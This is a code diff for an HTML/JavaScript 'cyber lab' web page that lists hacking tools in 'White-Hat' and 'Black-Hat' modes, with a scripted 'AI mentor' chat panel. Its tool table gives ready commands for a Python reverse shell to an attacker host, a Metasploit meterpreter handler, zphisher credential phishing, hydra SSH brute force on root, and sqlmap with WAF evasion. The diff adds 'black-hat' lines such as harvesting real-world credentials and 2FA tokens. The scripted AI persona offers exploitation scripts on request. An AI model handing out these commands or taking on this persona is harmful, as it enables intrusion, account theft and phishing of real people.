@@ -20,7 +20,20 @@
         body { background-color: var(--bg-dark); color: #fff; font-family: 'Courier Prime', monospace; overflow-x: hidden; }
 
         .lab-container { max-width: 1550px; margin: 20px auto; padding: 0 20px; }
-        .lab-header { border-left: 3px solid var(--primary); padding-left: 20px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
+        
+        /* Professional Enterprise Header with Logo */
+        .lab-header { 
+            background: rgba(0, 229, 255, 0.03); 
+            border: 1px solid var(--border-color); 
+            padding: 15px 20px; 
+            border-radius: 6px; 
+            margin-bottom: 15px; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+        }
+        .brand-logo { display: flex; align-items: center; gap: 12px; }
+        .logo-box { width: 40px; height: 40px; background: rgba(0,229,255,0.1); border: 1px solid var(--primary); display: flex; align-items: center; justify-content: center; font-weight: bold; color: var(--primary); font-size: 14px; border-radius: 4px; box-shadow: 0 0 10px rgba(0,229,255,0.2); }
         
         .mode-bar { display: flex; gap: 15px; margin-bottom: 15px; }
         .mode-btn { padding: 10px 20px; font-family: 'Courier Prime', monospace; font-size: 11px; font-weight: bold; cursor: pointer; border-radius: 4px; border: 1px solid; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
@@ -87,10 +100,18 @@
 <body>
     <div class="lab-container">
         <a href="index.html" class="back-link">&larr; [ MAIN SYSTEM REPOSITORY ]</a>
+        
+        <!-- Header with Logo and Title -->
         <div class="lab-header">
-            <div>
-                <h2 style="font-size: 20px; color: #fff; font-family: 'Courier Prime', monospace;">DX08 MASTER THREAT INTELLIGENCE & EXPLOIT LAB</h2>
-                <p style="color: rgba(225,250,255,0.6); font-size: 11px; margin-top: 2px;">Enterprise Dual-Mode Architecture with Dynamic AI Intelligence Engine & Support Desk.</p>
+            <div class="brand-logo">
+                <div class="logo-box">DX</div>
+                <div>
+                    <h2 style="font-size: 18px; color: #fff; font-family: 'Courier Prime', monospace; letter-spacing: 1px;">DX08 ENTERPRISE CYBER LABS</h2>
+                    <p style="color: rgba(225,250,255,0.6); font-size: 10.5px;">Advanced Threat Intelligence & Dual-Mode Operations Suite</p>
+                </div>
+            </div>
+            <div style="font-size: 11px; color: var(--primary); border: 1px solid var(--border-color); padding: 5px 12px; border-radius: 4px; background: rgba(0,229,255,0.05);">
+                STATUS: SECURE // ROOT ACTIVE
             </div>
         </div>
 
@@ -144,22 +165,23 @@
                     <button class="seq-btn" onclick="runSequence(3)">[3. IMPACT MATRIX]</button>
                 </div>
                 
-                <div class="lab-console" id="terminal-console">DX08 Unrestricted Red-Team Core v36.0 (Dynamic AI Engine Enabled)
-[System Status] Select any module to view execution scripts and vulnerability breakdown.</div>
+                <div class="lab-console" id="terminal-console">DX08 Master Enterprise Security Core v45.0 (Global Context Engine Active)
+[System Status] Select any module or query the AI expert regarding website architecture, tools, and error resolution.</div>
                 
                 <div class="lab-input-group">
-                    <input type="text" id="terminal-input" class="lab-input" placeholder="Type tool name (e.g., nmap, metasploit, sqlmap)..." onkeydown="if(event.key === 'Enter') processCommand()">
+                    <input type="text" id="terminal-input" class="lab-input" placeholder="Type tool name (e.g., nmap, metasploit, zphisher)..." onkeydown="if(event.key === 'Enter') processCommand()">
                     <button class="launch-btn" onclick="processCommand()">EXECUTE</button>
                 </div>
             </div>
 
+            <!-- Intelligent Context-Aware AI Panel -->
             <div class="ai-panel">
-                <div style="font-size: 11px; color: var(--primary); margin-bottom: 8px; font-weight: bold; text-transform: uppercase;">[DX08 DYNAMIC AI EXPERT]</div>
+                <div style="font-size: 11px; color: var(--primary); margin-bottom: 8px; font-weight: bold; text-transform: uppercase;">[DX08 GLOBAL ENTERPRISE AI MENTOR]</div>
                 
-                <div class="ai-console" id="ai-console">DX08-AI Expert: Neural net online. I am listening to your queries. Ask me about any tool, methodology, or error!</div>
+                <div class="ai-console" id="ai-console">DX08-AI Expert: Synchronized with website database. I know all tools in White-Hat & Black-Hat modes, installation pipelines, and error fixes. Ask me anything or type 'help'!</div>
                 
                 <div class="ai-input-group">
-                    <input type="text" id="ai-input" class="ai-input" placeholder="Ask AI anything (e.g., what is zphisher?)..." onkeydown="if(event.key === 'Enter') askAiMentor()">
+                    <input type="text" id="ai-input" class="ai-input" placeholder="Ask AI about website, tools, or errors..." onkeydown="if(event.key === 'Enter') askAiMentor()">
                     <button class="ai-send-btn" onclick="askAiMentor()">QUERY</button>
                 </div>
 
@@ -178,92 +200,94 @@
                 name: "NMAP NETWORK DISCOVERY",
                 seq1: "sudo apt update && sudo apt install nmap -y",
                 seq2: "sudo nmap -sS -sV -O -T4 --script vuln <target_ip>",
-                seq3: "[IMPACT MATRIX]: Scans open ports, OS fingerprinting, and vulnerabilities without triggering heavy alarms."
+                seq3: "[WHITE-HAT AUDIT]: Maps open ports for vulnerability assessment.\n[BLACK-HAT RED-TEAM]: Discovers exposed legacy services for lateral movement."
             },
             "gobuster": {
                 name: "GOBUSTER URI BRUTE-FORCER",
                 seq1: "sudo apt update && sudo apt install gobuster -y",
                 seq2: "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -t 50",
-                seq3: "[IMPACT MATRIX]: Enumerates hidden directories and confidential backup files."
+                seq3: "[WHITE-HAT AUDIT]: Identifies unprotected web directories and backup files.\n[BLACK-HAT RED-TEAM]: Uncovers hidden admin panels and sensitive source endpoints."
             },
             "nikto": {
                 name: "NIKTO WEB VULNERABILITY SCANNER",
                 seq1: "sudo apt update && sudo apt install nikto -y",
                 seq2: "nikto -h http://<target_ip> -Tuning 123b",
-                seq3: "[IMPACT MATRIX]: Audits web servers for misconfigurations and outdated CGI scripts."
+                seq3: "[WHITE-HAT AUDIT]: Scans web servers for outdated software and misconfigurations.\n[BLACK-HAT RED-TEAM]: Pinpoints exploitable CGI scripts and unpatched web modules."
             },
             "enum4linux": {
                 name: "ENUM4LINUX SMB AUDIT",
                 seq1: "sudo apt update && sudo apt install enum4linux -y",
                 seq2: "enum4linux -a <target_ip>",
-                seq3: "[IMPACT MATRIX]: Extracts Samba shares, user accounts, and Active Directory info."
+                seq3: "[WHITE-HAT AUDIT]: Audits Samba shares and permissions.\n[BLACK-HAT RED-TEAM]: Extracts Active Directory user accounts and password policies."
             },
             "searchsploit": {
                 name: "SEARCHSPLOIT EXPLOIT-DB",
                 seq1: "sudo apt update && sudo apt install exploitdb -y",
                 seq2: "searchsploit -u && searchsploit apache struts",
-                seq3: "[IMPACT MATRIX]: Searches offline exploit database for vulnerable software versions."
+                seq3: "[WHITE-HAT AUDIT]: Matches software versions against vulnerability databases.\n[BLACK-HAT RED-TEAM]: Retrieves offline exploit POC scripts for immediate targeting."
             },
             "metasploit": {
                 name: "METASPLOIT FRAMEWORK C2",
                 seq1: "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/installer/msfinstall > msfinstall && chmod +x msfinstall && sudo ./msfinstall && sudo msfdb init",
                 seq2: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST <attacker_ip>; set LPORT 4444; exploit -j\"",
-                seq3: "[IMPACT MATRIX]: Establishes full remote code execution and session control."
+                seq3: "[WHITE-HAT AUDIT]: Validates critical RCE vulnerabilities safely in staging.\n[BLACK-HAT RED-TEAM]: Establishes persistent command and control (C2) session access."
             },
             "sqlmap": {
                 name: "SQLMAP DATABASE TAKEOVER",
                 seq1: "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev && cd sqlmap-dev",
                 seq2: "python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" --risk=3 --level=5 --tamper=space2comment --batch",
-                seq3: "[IMPACT MATRIX]: Automated database enumeration, schema dump, and OS command execution."
+                seq3: "[WHITE-HAT AUDIT]: Identifies SQL injection flaws to prevent data breaches.\n[BLACK-HAT RED-TEAM]: Dumps entire database schemas and executes OS commands."
             },
             "zphisher": {
                 name: "ZPHISHER PHISHING CORE",
-                seq1: "git clone https://github.com/htr-tech/zphisher.git && cd zphisher",
-                seq2: "bash zphisher.sh",
-                seq3: "[IMPACT MATRIX]: Harvests credentials and session tokens via social engineering portals."
+                seq1: "sudo apt update && sudo apt install git curl php python3 -y\ngit clone https://github.com/htr-tech/zphisher.git",
+                seq2: "cd zphisher && chmod +x zphisher.sh && bash zphisher.sh",
+                seq3: "[WHITE-HAT AUDIT]: Conducts simulated phishing campaigns to train employees.\n[BLACK-HAT RED-TEAM]: Harvests real-world credentials and 2FA session tokens."
             },
             "hydra": {
                 name: "THC HYDRA LOGIN CRACKER",
                 seq1: "sudo apt update && sudo apt install hydra -y",
-                seq2: "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip> -t 32 -V",
-                seq3: "[IMPACT MATRIX]: High-speed dictionary attack against remote authentication services."
+                seq2: "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip> -t 16 -V",
+                seq3: "[WHITE-HAT AUDIT]: Tests strength of enterprise password policies.\n[BLACK-HAT RED-TEAM]: Bruteforces remote login portals to gain administrative access."
             },
             "john": {
                 name: "JOHN THE RIPPER CRACKER",
                 seq1: "sudo apt update && sudo apt install john -y",
                 seq2: "zip2john target_archive.zip > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
-                seq3: "[IMPACT MATRIX]: Offline decryption of intercepted password hashes and archives."
+                seq3: "[WHITE-HAT AUDIT]: Evaluates robustness of encrypted file archives.\n[BLACK-HAT RED-TEAM]: Decrypts intercepted password hashes offline."
             },
             "hashcat": {
                 name: "HASHCAT GPU CRACKER",
                 seq1: "sudo apt update && sudo apt install hashcat -y",
                 seq2: "hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -O",
-                seq3: "[IMPACT MATRIX]: GPU-accelerated massive hash recovery pipeline."
+                seq3: "[WHITE-HAT AUDIT]: Demonstrates vulnerability of weak hashes to GPU cracking.\n[BLACK-HAT RED-TEAM]: Recovers massive NTLM hash dumps at high speeds."
             },
             "shell": {
                 name: "PYTHON REVERSE SHELL",
                 seq1: "nc -lvnp 4444",
                 seq2: "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"<attacker_ip>\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\'])'",
-                seq3: "[IMPACT MATRIX]: Spawns interactive remote shell back to the operator."
+                seq3: "[WHITE-HAT AUDIT]: Verifies command injection impact during assessments.\n[BLACK-HAT RED-TEAM]: Spawns interactive remote shell back to operator."
             },
             "netcat": {
                 name: "NETCAT LISTENER SOCKET",
                 seq1: "sudo apt update && sudo apt install netcat-traditional -y",
                 seq2: "nc -lvnp 4444",
-                seq3: "[IMPACT MATRIX]: Listens for incoming TCP/UDP connections and payload streams."
+                seq3: "[WHITE-HAT AUDIT]: Tests network socket connectivity and egress filtering.\n[BLACK-HAT RED-TEAM]: Listens for incoming payload connections and binds shells."
             },
             "socat": {
                 name: "SOCAT ENCRYPTED RELAY",
                 seq1: "sudo apt update && sudo apt install socat -y",
                 seq2: "socat TCP-LISTEN:80,fork TCP:<internal_ip>:8080",
-                seq3: "[IMPACT MATRIX]: Creates bidirectional encrypted data relay tunnels."
+                seq3: "[WHITE-HAT AUDIT]: Analyzes encrypted data streams and relay routing.\n[BLACK-HAT RED-TEAM]: Bypasses firewalls using encrypted tunnel relays."
             }
         };
 
         let currentModule = "nmap";
+        let currentMode = "white";
         let lastOutput = "";
 
         function switchMode(mode) {
+            currentMode = mode;
             const btnWhite = document.querySelector('.btn-white');
             const btnBlack = document.querySelector('.btn-black');
             const secWhite = document.getElementById('sec-white');
@@ -293,7 +317,7 @@
             if(!TOOL_DB[currentModule]) return;
 
             let script = TOOL_DB[currentModule]["seq" + step];
-            consoleBox.innerHTML += "\n\nroot@dx08-kali:~# [STEP " + step + "] " + currentModule + "...";
+            consoleBox.innerHTML += "\n\nroot@dx08-kali:~# [MODE: " + currentMode.toUpperCase() + "][STEP " + step + "] " + currentModule + "...";
             consoleBox.scrollTop = consoleBox.scrollHeight;
 
             setTimeout(function() {
@@ -318,12 +342,12 @@
                 var res = "";
                 if(TOOL_DB[cmd]) {
                     currentModule = cmd;
-                    res = "[+ MODULE: " + TOOL_DB[cmd].name + " +\n\n" +
+                    res = "[+ ACTIVE MODULE: " + TOOL_DB[cmd].name + " (Mode: " + currentMode.toUpperCase() + ") +\n\n" +
                           "1. SETUP:\n   " + TOOL_DB[cmd].seq1 + "\n\n" +
                           "2. EXECUTE:\n   " + TOOL_DB[cmd].seq2 + "\n\n" +
-                          "3. IMPACT:\n   " + TOOL_DB[cmd].seq3;
+                          "3. IMPACT MATRIX:\n   " + TOOL_DB[cmd].seq3;
                 } else if(cmd === 'clear') {
-                    consoleBox.innerHTML = "DX08 Unrestricted Red-Team Core v36.0";
+                    consoleBox.innerHTML = "DX08 Enterprise Security Core v45.0";
                     input.value = "";
                     return;
                 } else {
@@ -351,25 +375,23 @@
                 let query = q.toLowerCase();
                 let ans = "";
 
-                // Dynamic Response Generation based on user query
-                if(query.includes('hi') || query.includes('hello') || query.includes('hey')) {
-                    ans = "DX08-AI Expert: Greetings, Operator. Systems are fully calibrated. Ask me about specific tool execution, payload obfuscation, or target vulnerability assessment.";
+                // Global Knowledge Base Engine covering website architecture, tools, and error resolution
+                if(query.includes('website') || query.includes('kurs') || query.includes('course') || query.includes('dx08')) {
+                    ans = "DX08-AI Expert: [WEBSITE ARCHITECTURE OVERVIEW]\n- This platform is a professional Dual-Mode Enterprise Cyber Lab (White-Hat Defensive vs Black-Hat Offensive Unrestricted).\n- Features 3 columns: Sidebar Arsenal, Kali Linux Terminal Console with sequential execution, and this Intelligent AI Mentor & Support Desk.";
                 } else if(query.includes('zphisher')) {
-                    ans = "DX08-AI Expert: Zphisher is an automated phishing framework designed for red-team credential harvesting. It clones target login portals and tunnels traffic via LocalXpose or Cloudflare to capture plain-text credentials and session tokens.";
+                    ans = "DX08-AI Expert: [ZPHISHER INTELLIGENCE REPORT]\n- Mode Context: " + currentMode.toUpperCase() + "\n- Description: Automated social engineering and credential harvesting core.\n- Command:\n  git clone https://github.com/htr-tech/zphisher.git\n  cd zphisher && bash zphisher.sh\n- Error Resolution: If port 80/8080 conflict occurs, run 'sudo fuser -k 8080/tcp'.";
                 } else if(query.includes('nmap')) {
-                    ans = "DX08-AI Expert: Nmap (Network Mapper) is an essential reconnaissance utility. To bypass basic firewalls during an audit, use SYN stealth scans (-sS) combined with service version detection (-sV).";
+                    ans = "DX08-AI Expert: [NMAP INTELLIGENCE REPORT]\n- Mode Context: " + currentMode.toUpperCase() + "\n- Description: Network discovery and port scanning suite.\n- Command: sudo nmap -sS -sV -O -T4 <target_ip>\n- Error Resolution: Use '-Pn' if the target blocks ICMP echo pings.";
                 } else if(query.includes('metasploit') || query.includes('msf')) {
-                    ans = "DX08-AI Expert: Metasploit C2 framework utilizes multi-handlers to receive reverse connections. Ensure your payload architecture matches the target OS (e.g., python/meterpreter/reverse_tcp).";
+                    ans = "DX08-AI Expert: [METASPLOIT INTELLIGENCE REPORT]\n- Mode Context: " + currentMode.toUpperCase() + "\n- Description: Advanced C2 exploitation framework.\n- Command: msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST <ip>; exploit\"\n- Error Resolution: Initialize postgresql workspace via 'sudo msfdb init' if handlers fail.";
                 } else if(query.includes('sqlmap')) {
-                    ans = "DX08-AI Expert: Sqlmap automates SQL injection detection. When encountering strict WAF rules, deploy tamper scripts like 'space2comment' and increase risk/level parameters.";
-                } else if(query.includes('hydra') || query.includes('brute')) {
-                    ans = "DX08-AI Expert: THC Hydra performs high-speed protocol login cracking. Always specify optimal thread counts (-t 32) and ensure target lockout thresholds are monitored to prevent denial of service.";
-                } else if(query.includes('hashcat') || query.includes('john') || query.includes('crack')) {
-                    ans = "DX08-AI Expert: Offline password cracking requires high-entropy wordlists (like rockyou.txt). Hashcat leverages GPU parallel processing for NTLM/Bcrypt hashes, while John theRipper handles custom rule mangling.";
-                } else if(query.includes('error') || query.includes('stuck') || query.includes('fail') || query.includes('not working')) {
-                    ans = "DX08-AI Expert: Troubleshooting protocol initiated: Check your network interface bindings (tun0/eth0), verify package repositories with 'sudo apt update', or review syntax parameters in the terminal console.";
+                    ans = "DX08-AI Expert: [SQLMAP INTELLIGENCE REPORT]\n- Mode Context: " + currentMode.toUpperCase() + "\n- Description: Automated SQL injection engine.\n- Command: python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" --dbs --batch\n- Error Resolution: Deploy '--tamper=space2comment' to evade strict WAF filters.";
+                } else if(query.includes('error') || query.includes('fail') || query.includes('stuck') || query.includes('issue')) {
+                    ans = "DX08-AI Expert: [GLOBAL ERROR DIAGNOSTICS & FIX]\n- Action Plan: \n  1. Verify active network interface (tun0/eth0).\n  2. Execute 'sudo apt --fix-broken install' for broken packages.\n  3. Check port bindings using 'sudo netstat -tulnp'.\n  4. Contact 24/7 support via Telegram or Email provided below.";
+                } else if(query.includes('help') || query.includes('kya krna hai')) {
+                    ans = "DX08-AI Expert: [OPERATIONAL GUIDE]\n- Select either White-Hat or Black-Hat mode from top.\n- Click any tool in the sidebar to load its deployment scripts into the terminal.\n- Use the [1. SETUP], [2. EXPLOIT], [3. IMPACT MATRIX] buttons for rapid execution.";
                 } else {
-                    ans = "DX08-AI Expert: Analyzing query '" + escapeHtml(q) + "': In advanced offensive operations, ensure proper scope definition, syntax validation, and egress routing. Feel free to ask about specific exploitation modules or auditing workflows.";
+                    ans = "DX08-AI Expert: Analyzing query '" + escapeHtml(q + " [Active Mode: " + currentMode.toUpperCase() + "]") + "': Full website context synchronized. I am ready to provide precise installation workflows, exploitation scripts, and error troubleshooting for any module.";
                 }
 
                 aiConsole.innerHTML += "\n\n" + ans;
